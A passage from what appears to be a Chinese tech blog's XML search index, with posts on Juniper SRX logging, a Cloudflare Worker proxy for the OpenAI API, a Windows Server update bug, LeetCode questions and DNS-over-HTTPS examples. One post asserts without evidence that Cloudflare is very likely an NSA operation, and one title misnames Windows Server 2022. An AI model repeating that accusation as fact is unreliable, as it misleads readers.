<span class="token function">file</span> lab-deny.log user any<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> lab-deny.log match edu-infra-ban<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> traffic-screens any any<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> traffic-screens match RT_SCREEN<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> dc-deny.log user any<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> dc-deny.log match ban-remote-control<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> security-log.log any any<span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> security-log.log archive files <span class="token number">1</span><span class="token builtin class-name">set</span> system syslog <span class="token function">file</span> security-log.log structured-data<span class="token builtin class-name">set</span> security log mode event<span class="token builtin class-name">set</span> security policies from-zone Lab to-zone Edu policy edu-infra-ban <span class="token keyword">then</span> log session-init<span class="token builtin class-name">set</span> security policies from-zone Lab to-zone Edu policy edu-infra-ban <span class="token keyword">then</span> log session-close<span class="token builtin class-name">set</span> security policies from-zone Edu to-zone DC policy ban-remote-control <span class="token keyword">then</span> log session-init<span class="token builtin class-name">set</span> security policies from-zone Edu to-zone DC policy ban-remote-control <span class="token keyword">then</span> log session-close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="references">References</h2><ul><li><a href="https://supportportal.juniper.net/s/article/SRX-How-to-switch-to-Transparent-Mode-L2-Mode-using-J-Web?language=en_US">[SRX]How to switch to Transparent Mode (L2 Mode) using J-Web</a></li><li><a href="https://supportportal.juniper.net/s/article/SRX-Configuration-Example-Transparent-mode-on-SRX-platforms?language=en_US">[SRX]Configuration Example - Transparent mode on SRX platforms</a></li><li><a href="https://supportportal.juniper.net/s/article/SRX-Example-Configure-Transparent-mode-on-Junos-OS-15-1X49-SRX-platform?language=en_US">[SRX]Example - Configure Transparent mode on Junos OS 15.1X49 SRXplatform</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Juniper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Cloudflare Workers 解决 OpenAI 和 ChatGPT 的 API 无法访问</title>
      <link href="/2023/03/24/shi-yong-cloudflare-workers-jie-jue-openai-he-chatgpt-de-api-wu-fa-fang-wen/"/>
      <url>/2023/03/24/shi-yong-cloudflare-workers-jie-jue-openai-he-chatgpt-de-api-wu-fa-fang-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="使用-cloudflare-workers-解决-openai-和-chatgpt-的-api-无法访问">使用Cloudflare Workers 解决 OpenAI 和 ChatGPT 的 API 无法访问</h1><p>事实证明 ChatGPT 是足够火爆的，火爆到什么程度呢，其 API一经推出便获得了 GFW 的认证。在 Twitter上看到很多人都在为解决无法正常访问 OpenAI 的 API而苦恼，最常见解决方案是使用一台服务器来进行反向代理，但这样又徒增了一些成本。因为之前在公司的业务上遇到过类似问题，当时老板找到了一个还不错的几乎零成本解决方案，试了一下现在仍然可以用来解决OpenAI 的 API 无法访问的问题，所以在这里推荐给大家。</p><p>该方案的主要思路是使用 Cloudflare 的 Workers 来代理 OpenAI 的 API地址，配合自己的域名即可在境内实现访问。因为 Cloudflare Workers有每天免费 10万次的请求额度，也有可以免费注册的域名，所以几乎可以说是零成本。而且该方法理论上支持所有被认证的网站，而不只是OpenAI。</p><p>使用这个方案需要你有以下东西：</p><ul><li>一个没有被 GFW 认证的域名</li><li>一个 Cloudflare 账号（当然也可以现注册）</li></ul><h2 id="tldr">TL;DR</h2><ol type="1"><li>新建一个 Cloudflare Worker</li><li>将 https://gist.github.com/noobnooc/d0407b5fb81cff9d36f981170b99d4e6里的代码粘贴到 Worker 中并部署</li><li>给 Worker 绑定一个没有被 GFW 认证的域名</li><li>使用自己的域名代替 <code>api.openai.com</code></li></ol><p>如果具体步骤有问题，可以参考下面的详细版教程。</p><h2 id="将域名-ns-转到-cloudflare">将域名 NS 转到 Cloudflare</h2><p>如果域名已经托管在 Cloudflare 的忽略这一步即可。</p><p>Cloudflare Workers 的域名绑定仅支持托管在 Cloudflare上的域名。由于本人常年是把域名托管在 Cloudflare的没有注意到这一点，所以得先将域名的 NS 转到Cloudflare，如果介意将域名转到 Cloudflare 的话，可以考虑使用 nginx反代、Docker 容器等其他方法 。</p><p>没有 Cloudflare账号的话可以注册一个，具体注册细节就不多说了。注册或登录到 Cloudflare的管理界面后，点击侧边栏的 “Websites” ，然后点击 “Add a Site”按钮准备将域名转到 Cloudflare：</p><p><a href="https://user-images.githubusercontent.com/38027416/222916699-9f076d54-4f5b-4420-9d28-c3575d83c6a0.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222916699-9f076d54-4f5b-4420-9d28-c3575d83c6a0.png"></a></p><p>在 “Enter your site (example.com)” 处输入要转入的域名后，点击 “AddSite”：</p><p><a href="https://user-images.githubusercontent.com/38027416/222916797-637a6fff-8331-423a-bbff-13183dcd041a.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222916797-637a6fff-8331-423a-bbff-13183dcd041a.png"></a></p><p>根据 Cloudflare 的提示，在域名注册商处将 NS 修改到 Cloudflare指定的地址，等待域名解析成功后，即可进行后续操作。</p><h2 id="创建一个-cloudflare-worker">创建一个 Cloudflare Worker</h2><p>登录到 Cloudflare 的管理界面后，点击侧边栏的 “Workers” 选项，然后点击“Create a Service” 创建一个 Worker。</p><p><a href="https://user-images.githubusercontent.com/38027416/222871270-d973e2bd-74f9-4efa-b080-e665903a7bac.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222871270-d973e2bd-74f9-4efa-b080-e665903a7bac.png"></a></p><p>然后在创建界面中输入 “Service name” 后点击 “Create Service” 按钮新建Worker。“Select a starter” 项先不用管。</p><p><a href="https://user-images.githubusercontent.com/38027416/222871439-4ac253c6-d87f-434e-a8e8-3d05c652217d.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222871439-4ac253c6-d87f-434e-a8e8-3d05c652217d.png"></a></p><p>至此 Cloudflare 的 Worker 便创建好了，下面开始修改 Worker的代码，使其能代理 OpenAI 的 API。</p><h2 id="修改-cloudflare-worker-的代码">修改 Cloudflare Worker的代码</h2><p>在 Worker 的管理界面，点击右上角的 “Quick Edit” 按钮编辑代码 Worker的代码。</p><p><a href="https://user-images.githubusercontent.com/38027416/222871710-c1d4834e-3bb4-49cf-a9dd-b7dcee258112.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222871710-c1d4834e-3bb4-49cf-a9dd-b7dcee258112.png"></a></p><p>在左侧的代码编辑器中，删除现有的所有代码，然后复制粘贴以下内容到代码编辑器：</p><blockquote><p>简化后的代码来自 https://github.com/x-dr/chatgptProxyAPI</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">TELEGRAPH_URL</span> <span class="token operator">=</span> <span class="token string">'https://api.openai.com'</span><span class="token punctuation">;</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span><span class="token function">handleRequest</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span><span class="token parameter">request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>  url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token constant">TELEGRAPH_URL</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> modifiedRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token literal-property property">headers</span><span class="token operator">:</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">,</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>    <span class="token literal-property property">body</span><span class="token operator">:</span> request<span class="token punctuation">.</span>body<span class="token punctuation">,</span>    <span class="token literal-property property">redirect</span><span class="token operator">:</span> <span class="token string">'follow'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>modifiedRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> modifiedResponse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>body<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 添加允许跨域访问的响应头</span>  modifiedResponse<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> modifiedResponse<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后点击编辑器右下角的 “Save and deploy”按钮部署该代码，在弹出的对话框中继续选择 “Save and deploy”确认部署。</p><p><a href="https://user-images.githubusercontent.com/38027416/222872146-bf4c8f30-307a-4511-9be6-8c19db5cab43.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222872146-bf4c8f30-307a-4511-9be6-8c19db5cab43.png"></a></p><p>至此，便可以使用该 worker 的地址来代替 OpenAI 的 API地址了。比如想要请求 ChatGPT 的 API 时，把官方文档中的<code>https://api.openai.com/v1/chat/completions</code> 替换成<code>https://openai.workers.dev</code>即可（注意这个地址并不存在，是需要换成自己刚刚创建的 Worker的地址）。</p><p>但是你可能会发现，这样做了依然还是没有解决问题，因为 CloudflareWorkers 的 <code>workers.dev</code> 域名也是被 GFW认证过的🥲。但是好在只是认证了 <code>workers.dev</code> 域名，而 ip还是幸存的状态，所以我们可以给 Worker 绑定一个自己的域名。</p><h2 id="绑定域名">绑定域名</h2><p>在 Cloudflare Workers 的管理界面中，点击 “Triggers” 选项卡，然后点击“Custom Domians” 中的 “Add Custom Domain” 按钮以绑定域名。</p><p><a href="https://user-images.githubusercontent.com/38027416/222872491-026600f5-c04c-49c5-9fdf-4d4abb0b66f7.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222872491-026600f5-c04c-49c5-9fdf-4d4abb0b66f7.png"></a></p><p>输入域名后点击 “Add Custom Domain”，目前只支持 NS 托管在 Cloudflare上的域名，如果不介意，可以点击 Cloudflare 侧边栏的 “Websites”，然后点击“Add a Site” 按钮，根据提示将域名的 NS 记录指定到 Cloudflare。</p><p><a href="https://user-images.githubusercontent.com/38027416/222872581-b99c8870-bcc7-4b8d-ba1e-1ad7830ce776.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222872581-b99c8870-bcc7-4b8d-ba1e-1ad7830ce776.png"></a></p><p>至此便大功告成。等待片刻，应该就可以通过你自己的域名来代替 OpenAI 的API 地址了，比如在本文的例子中，想要请求 ChatGPT 的 API ，即是把官方 API地址 <code>https://api.openai.com/v1/chat/completions</code>换为我自己的域名<code>https://openai.nooc.ink/v1/chat/completions</code>，其他参数均参照官方示例即可。由于 Cloudflare 有每天免费 10万次的请求额度，所以轻度使用基本是零成本的。注意请不要使用我这里的<code>openai.nooc.ink</code>，因为随时可能会被我关闭</p><p><a href="https://user-images.githubusercontent.com/38027416/222873100-8979dd0e-9572-4d6b-92d6-86d012bdd188.png"><img src="https://googles.plus/images/loading.gif" data-original="https://user-images.githubusercontent.com/38027416/222873100-8979dd0e-9572-4d6b-92d6-86d012bdd188.png"></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>苹方字体资源合集</title>
      <link href="/2023/03/24/ping-fang-zi-ti-zi-yuan-he-ji/"/>
      <url>/2023/03/24/ping-fang-zi-ti-zi-yuan-he-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="苹方字体资源合集">苹方字体资源合集</h1><ul><li>https://blog.dsrkafuu.net/post/2020/extract-sf-pingfang/</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>问题记录：Windows Server 2023 二月更新后无法启动</title>
      <link href="/2023/03/17/wen-ti-ji-lu-windows-server-2023-er-yue-geng-xin-hou-wu-fa-qi-dong/"/>
      <url>/2023/03/17/wen-ti-ji-lu-windows-server-2023-er-yue-geng-xin-hou-wu-fa-qi-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="问题记录windows-server-2023-二月更新后无法启动">问题记录：WindowsServer 2023 二月更新后无法启动</h1><blockquote><p>2023 年 2 月 14 日发布的 Windows Server 安全更新 KB5022842 触发了一个bug。虚拟机在重启后无法再启动，干脆进不去 bootmgr了。禁用安全启动有帮助——微软和 VMware 已经确认了这个错误。</p></blockquote><p>https://learn.microsoft.com/en-us/windows/release-health/status-windows-server-2022#3017msgdesc</p><h2 id="补丁信息">补丁信息</h2><p>February 14, 2023—KB5022842 (OS Build 20348.1547)</p><p>https://support.microsoft.com/en-us/topic/be155955-29f7-47c4-855c-34bd43895940</p><h2 id="解决方案">解决方案</h2><p>关闭安全启动和 VBS。</p><h2 id="more-information">More Information</h2><p>Notes from VMware’s documentation:</p><pre><code>Virtual machines running on any version of vSphere ESXi 8.0.x are not impacted by this issuevSphere ESXi 6.7 is End of general Support. For more information, see The End of General Support for vSphere 6.5 and vSphere 6.7 is October 15, 2022.If you already face the issue, after patching the host to ESXi 7.0 Update 3k, just power on the affected Windows Server 2022 VMs. After you patch a host to ESXi 7.0 Update 3k, you can migrate a running Windows Server 2022 VM from a host of version earlier than ESXi 7.0 Update 3k, install KB5022842, and the VM boots properly without any additional steps required.</code></pre><p>Affected platforms:</p><pre><code>Client: NoneServer: Windows Server 2022</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> BugFix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cisco Leetcode Questions</title>
      <link href="/2023/03/17/cisco-leetcode-questions/"/>
      <url>/2023/03/17/cisco-leetcode-questions/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">809Expressive Words468Validate IP Address212Word Search II91Decode Ways48Rotate Image394Decode String79Word Search423Reconstruct Original Digits from English2016Maximum Difference Between Increasing Elements327Count of Range Sum881Boats to Save People198House Robber741Cherry Pickup53Maximum Subarray526Beautiful Arrangement1235Maximum Profit in Job Scheduling17Letter Combinations of a Phone Number20Valid Parentheses1492The kth Factor of n1010Pairs of Songs With Total Durations Divisible by 60443String Compression191Number of 1 Bits41First Missing Positive518Coin Change 2153Sum206Reverse Linked List204Count Primes146LRU Cache56Merge Intervals412Fizz Buzz121Best Time to Buy and Sell Stock560Subarray Sum Equals K50Pow(x, n)49Group Anagrams2Add Two Numbers215Kth Largest Element in an Array125Valid Palindrome977Squares of a Sorted Array344Reverse String14Longest Common Prefix165Compare Version Numbers402Remove K Digits1Two Sum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSA 棱镜门与上游监听</title>
      <link href="/2023/03/17/nsa-leng-jing-men-yu-shang-you-jian-ting/"/>
      <url>/2023/03/17/nsa-leng-jing-men-yu-shang-you-jian-ting/</url>
      
        <content type="html"><![CDATA[<h1 id="nsa-棱镜门与上游监听计划">NSA 棱镜门与上游监听计划</h1><h2 id="简介">简介</h2><h2 id="计划中的代号">计划中的代号</h2><p>https://www.electrospaces.net/p/nicknames-and-codewords.html</p><h2 id="cloudflare">Cloudflare</h2><h3 id="how-likely-is-it-that-cloudflare-is-an-nsa-operation">How likelyis it that CloudFlare is an NSA operation?</h3><p>Cloudflare's business model is to be a<strong>Man-In-The-Middle</strong> for every DNS Query and every HTTPTransaction. This makes it very suspicious and makes me think ofCloudflare as providing NSA or other security agencies access to thedata and logs they collect. HOW? No matter how secure your cloudflarebased website is for the entire world, at cloudflare datacenters its allNaked. All the encryption and protection ends there and data isre-encrypted before sending to the origin servers/users. So, you arefully secured from 3rd parties, but fully naked for them.<strong>Security Agencies know this.</strong> So, I would say, it is<strong>VERY LIKELY</strong> that either Cloudflare is an NSA project,or it is actively providing data to NSA or other agencies. Look at thecloudflare products, and decide for yourself:Free Secure 1.1.1.1 “DNSDirectory”.Free DNS, with DNS over HTTPS.Free CDN.Free SSL certificates(SSL terminates at their data centers. They can see you.)Zero-MarginDomain Registrar, means bigger piece of the DNS cake.For all the abovesecurity related offerings... you are being protected from the entireworld, but at cloudflare datacenters everything is being decrypted andvisible. Considering the above points, Cloudflare can make it easy foragencies to do the surveillance at massive scale while at the same timepreventing other country governments to do the same because of“Everything-Single-Thing-Over-Encrypted-Connection”.</p><h2 id="reference">Reference</h2><ul><li>https://www.electrospaces.net/p/nicknames-and-codewords.html</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Cybersecurity </tag>
            
            <tag> NSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS-over-HTTPS (DoH) 学习笔记</title>
      <link href="/2023/03/10/dns-over-https-doh-xue-xi-bi-ji/"/>
      <url>/2023/03/10/dns-over-https-doh-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="dns-over-https-doh">DNS-over-HTTPS (DoH)</h1><h2 id="why-doh">Why DoH?</h2><p>传统的 DNS 查询是明文传输的（UDP:53），且彼时未虑及现代安全性的需要，未利用密码学等手段进行加密或验证。这意味着恶意用户可以拦截、窃取、篡改DNS查询，甚至精准跟踪用户活动。虽然后来的DNSSEC方案通过电子签名进行验证，强化了DNS的安全性，并能够抵御DNS投毒污染等篡改通信的手段，但其对于中间网络设备进行的监听仍然没有抵御能力（随后，监听者可以通过获取的通信数据知晓用户访问了哪一域名，而域名往往与具体的网站相关系）。此外，DNSSEC的起效要求现有的大量DNS解析服务的提供商（常为互联网服务提供商或第三方大型互联网机构）对已有的DNS服务器进行大范围修改等问题，其推进进程并不理想。而对于DNSoverHTTPS，在正确部署服务端并妥善配置客户端的前提下，互联网服务提供商或其它中间网络设备无法解密（亦即无法获知请求的实际内容）或者篡改已经加密的HTTPS通信，故其能够有效保护互联网用户的安全及隐私；另一方面，其基于已经成熟并已广泛部署的HTTPS协议，客户端进行利用较为方便。</p><p>此外，一些网络服务提供商和公共 Wi-Fi 热点经常会操纵 DNS查询，将用户重定向到他们自己的服务器上，这种行为可能导致安全问题。使用DoH 可以防止这种操纵，并确保您正在连接到预期的网站。</p><p>DoH 提供了更高的安全性和隐私保护，更加可靠的 DNS连接和更好的互联网体验。</p><h2 id="doh-的请求形式">DoH 的请求形式</h2><p>DoH 请求形式是使用 HTTPS 协议进行的。在传统 DNS 查询中，DNS 请求使用UDP <strong>或 TCP</strong> 进行明文传输，而在使用 DoH 时，DNS 请求通过HTTPS 请求进行加密传输。</p><p>具体来说，当计算机或设备需要解析域名时，它会向配置的 DoH服务器发送一个 HTTPS POST 请求，请求内容包含 DNS 查询信息。DoH服务器将查询结果作为 HTTPS 响应返回给计算机或设备，然后将其解析为 IP地址，并允许该设备连接到所需的网站。</p><p>DoH 的请求和响应消息格式基于 RFC 8484<a href="https://www.rfc-editor.org/rfc/rfc8484">1</a> 中定义的 DNS overHTTPS 规范。该规范定义了 DNS 查询和响应消息的格式，以及如何在 HTTPS中使用它们。通常，DoH 服务器依靠 HTTP/2多路复用技术并发处理多个查询，从而提高性能和效率。</p><blockquote><p>Also see:</p><p>DNS Wire Format: https://www.rfc-editor.org/rfc/rfc1035</p></blockquote><p>但为方便开发者使用，许多 DNS 服务（GoogleDNS, AlibabaDNS）支持使用JSON API (GET) 的方法调用。</p><h3 id="以-google-dns-为例">以 Google DNS 为例</h3><h4 id="http-方法">HTTP 方法</h4><ul><li><p>GET</p><p>使用 GET 方法可以缩短延迟时间，因为它可以更高效地缓存。 RFC 8484 GET请求必须具有包含 Base64Url 编码的 DNS 消息的 <code>?dns=</code>查询参数。GET 方法是 JSON API 支持的唯一方法。</p></li><li><p>POST</p><p>POST 方法仅受 RFC 8484 API 支持，并且使用二进制 DNS消息，并在请求正文和 DoH HTTP 响应中显示<code>Content-Type application/dns-message</code>。</p></li><li><p>HEAD</p><p><em>HEAD 目前不受支持，并返回 400 Bad Request 错误</em>。</p></li></ul><p>其他方法会返回 501 Not Implemented 错误。</p><h3 id="python-doh-请求-opendns">Python DoH 请求 (OpenDNS)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> dns<span class="token punctuation">.</span>message<span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">doh_req</span><span class="token punctuation">(</span>doh_url<span class="token punctuation">,</span> domain<span class="token punctuation">,</span> rr<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    message <span class="token operator">=</span> dns<span class="token punctuation">.</span>message<span class="token punctuation">.</span>make_query<span class="token punctuation">(</span>domain<span class="token punctuation">,</span> rr<span class="token punctuation">)</span>    dns_req <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>message<span class="token punctuation">.</span>to_wire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>doh_url <span class="token operator">+</span> <span class="token string">"?dns="</span> <span class="token operator">+</span> dns_req<span class="token punctuation">,</span>                     headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Content-type"</span><span class="token punctuation">:</span> <span class="token string">"application/dns-message"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> answer <span class="token keyword">in</span> dns<span class="token punctuation">.</span>message<span class="token punctuation">.</span>from_wire<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>answer<span class="token punctuation">:</span>        dns_response <span class="token operator">=</span> answer<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>            <span class="token punctuation">{</span><span class="token string">"Query"</span><span class="token punctuation">:</span> dns_response<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"TTL"</span><span class="token punctuation">:</span> dns_response<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"RR"</span><span class="token punctuation">:</span> dns_response<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Answer"</span><span class="token punctuation">:</span> dns_response<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    doh_url_test <span class="token operator">=</span> <span class="token string">"https://doh.opendns.com/dns-query"</span>    domain_test <span class="token operator">=</span> <span class="token string">"example.com"</span>    rr_test <span class="token operator">=</span> <span class="token string">"A"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>doh_req<span class="token punctuation">(</span>doh_url_test<span class="token punctuation">,</span> domain_test<span class="token punctuation">,</span> rr_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 DoH 的世界里，最初的DoH实现并没有使用JSONAPI，而是使用HTTP/2作为通信的底层协议。一个原因可能是HTTP/2是一种更成熟和广泛使用的协议，非常适合高性能应用程序，例如DoH。另一个原因可能是在最初实现DoH时，JSONAPI尚未被广泛采用，并且可能不被认为是协议的适当选择。更何况在那个年代，高性能的JSON 库还是个问题呢。</p><blockquote><p>此外，值得注意的是，JSONAPI并不是协议或标准本身，而是使用JSON构建API的规范。虽然JSON是一种轻量级的数据格式，在Web开发中广泛使用，但根据性能、复杂性和与现有系统的互操作性等因素，它可能并不总是所有应用程序和用例的最佳解决方案。</p></blockquote><p>好了，我们把目光转回 DoH 的 DNS请求。从代码上看，它发送了一个简单的GET请求，其中<code>dns</code>为要解析的域名和所需的记录类型。当然了，这里我们还需要将<code>Accept</code>头指定为<code>application/dns-json</code>。</p><p>它们最终会被编码为 <strong>DNS Wire Format</strong> 格式（外加一次Base64）：</p><blockquote><p>DNS Wire Format: https://datatracker.ietf.org/doc/html/rfc1035</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">'q80BAAABAAAAAAAAA3d3dwZnb29nbGUDY29tAAABAAE='</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">|</span> <span class="token punctuation">\</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-H</span> <span class="token string">'content-type: application/dns-message'</span> <span class="token punctuation">\</span>    --data-binary @- https://cloudflare-dns.com/dns-query <span class="token operator">|</span> <span class="token punctuation">\</span>    hexdump <span class="token parameter variable">-C</span><span class="token comment"># Server Response:</span>00000000  ab <span class="token builtin class-name">cd</span> <span class="token number">81</span> <span class="token number">80</span> 00 01 00 01  00 00 00 01 03 <span class="token number">77</span> <span class="token number">77</span> <span class="token number">77</span>  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.www<span class="token operator">|</span>00000010  06 <span class="token number">67</span> 6f 6f <span class="token number">67</span> 6c <span class="token number">65</span> 03  <span class="token number">63</span> 6f 6d 00 00 01 00 01  <span class="token operator">|</span>.google.com<span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token operator">|</span>00000020  c0 0c 00 01 00 01 00 00  00 ab 00 04 d8 3a <span class="token builtin class-name">cd</span> <span class="token number">64</span>  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.:.d<span class="token operator">|</span>00000030  00 00 <span class="token number">29</span> 05 ac 00 00 00  00 00 00                 <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">)</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>0000003b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="请求">请求</h4><p><img src="https://googles.plus/images/loading.gif" data-original="/images/DNS-over-HTTPS-DoH-学习笔记/image-20230310164545616.png"></p><p>以 <code>example.com</code> 为例：</p><p><code>b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'</code>是一个 DNS 查询的二进制数据包，它代表了一个向 DNS 服务器查询 "<a href="http://example.com">example.com</a>" 